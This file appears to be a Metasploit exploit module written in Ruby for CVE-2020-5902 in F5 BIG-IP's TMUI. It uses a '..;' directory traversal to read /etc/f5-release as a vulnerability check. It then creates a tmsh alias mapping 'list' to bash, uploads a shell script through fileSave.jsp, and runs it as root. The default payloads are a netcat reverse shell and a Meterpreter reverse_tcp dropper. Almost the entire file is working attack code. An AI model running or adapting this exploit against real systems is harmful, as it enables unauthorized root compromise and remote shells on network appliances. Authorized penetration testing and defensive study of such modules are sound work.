##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'F5 BIG-IP TMUI Directory Traversal and File Upload RCE',
        'Description' => %q{
          This module exploits a directory traversal in F5's BIG-IP Traffic
          Management User Interface (TMUI) to upload a shell script and execute
          it as the root user.

          Versions 11.6.1-11.6.5, 12.1.0-12.1.5, 13.1.0-13.1.3, 14.1.0-14.1.2,
          15.0.0, and 15.1.0 are known to be vulnerable. Fixes were introduced
          in 11.6.5.2, 12.1.5.2, 13.1.3.4, 14.1.2.6, and 15.1.0.4.

          Tested on the VMware OVA release of 14.1.2.
        },
        'Author' => [
          'Mikhail Klyuchnikov', # Discovery
          'wvu' # Analysis and exploit
        ],
        'References' => [
          ['CVE', '2020-5902'],
          ['URL', 'https://support.f5.com/csp/article/K52145254'],
          ['URL', 'https://www.ptsecurity.com/ww-en/about/news/f5-fixes-critical-vulnerability-discovered-by-positive-technologies-in-big-ip-application-delivery-controller/']
        ],
        'DisclosureDate' => '2020-06-30', # Vendor advisory
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            'Platform' => 'unix',
            'Arch' => ARCH_CMD,
            'Type' => :unix_cmd,
            'DefaultOptions' => {
              'PAYLOAD' => 'cmd/unix/reverse_netcat_gaping'
            }
          ],
          [
            'Linux Dropper',
            'Platform' => 'linux',
            'Arch' => [ARCH_X86, ARCH_X64],
            'Type' => :linux_dropper,
            'DefaultOptions' => {
              'CMDSTAGER::FLAVOR' => :bourne,
              'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'SSL' => true,
          'WfsDelay' => 5
        },
        'Notes' => {
          'Stability' => [SERVICE_RESOURCE_LOSS], # May disrupt the service
          'Reliability' => [UNRELIABLE_SESSION], # Seems a little finicky
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      Opt::RPORT(443),
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])

    register_advanced_options([
      OptString.new('WritableDir', [true, 'Writable directory', '/tmp'])
    ])

    # XXX: https://github.com/rapid7/metasploit-framework/issues/12963
    import_target_defaults
  end

  def check
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => dir_trav('/tmui/locallb/workspace/fileRead.jsp'),
      'vars_post' => {
        'fileName' => '/etc/f5-release'
      }
    )

    unless res
      return CheckCode::Unknown('Target did not respond to check request.')
    end

    unless res.code == 200 && /BIG-IP release (?<version>[\d.]+)/ =~ res.body
      return CheckCode::Safe('Target did not respond with BIG-IP version.')
    end

    # If we got here, the directory traversal was successful
    CheckCode::Vulnerable("Target is running BIG-IP #{version}.")
  end

  def exploit
    create_alias

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end

    delete_alias if @created_alias
  end

  def create_alias
    print_status('Creating alias list=bash')

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => dir_trav('/tmui/locallb/workspace/tmshCmd.jsp'),
      'vars_post' => {
        'command' => 'create cli alias private list command bash'
      }
    )

    unless res && res.code == 200 && res.get_json_document['error'].blank?
      fail_with(Failure::UnexpectedReply, 'Failed to create alias list=bash')
    end

    @created_alias = true

    print_good('Successfully created alias list=bash')
  end

  def execute_command(cmd, _opts = {})
    vprint_status("Executing command: #{cmd}")

    upload_script(cmd)
    execute_script
  end

  def upload_script(cmd)
    print_status("Uploading #{script_path}")

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => dir_trav('/tmui/locallb/workspace/fileSave.jsp'),
      'vars_post' => {
        'fileName' => script_path,
        'content' => cmd
      }
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "Failed to upload #{script_path}")
    end

    register_file_for_cleanup(script_path)

    print_good("Successfully uploaded #{script_path}")
  end

  def execute_script
    print_status("Executing #{script_path}")

    send_request_cgi({
      'method' => 'POST',
      'uri' => dir_trav('/tmui/locallb/workspace/tmshCmd.jsp'),
      'vars_post' => {
        'command' => "list #{script_path}"
      }
    }, 3.5)
  end

  def delete_alias
    print_status('Deleting alias list=bash')

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => dir_trav('/tmui/locallb/workspace/tmshCmd.jsp'),
      'vars_post' => {
        'command' => 'delete cli alias private list'
      }
    )

    unless res && res.code == 200 && res.get_json_document['error'].blank?
      print_warning('Failed to delete alias list=bash')
      return
    end

    print_good('Successfully deleted alias list=bash')
  end

  def dir_trav(path)
    # PoC courtesy of the referenced F5 advisory: <LocationMatch ".*\.\.;.*">
    normalize_uri(target_uri.path, '/tmui/login.jsp/..;', path)
  end

  def script_path
    @script_path ||=
      normalize_uri(datastore['WritableDir'], rand_text_alphanumeric(8..42))
  end

end
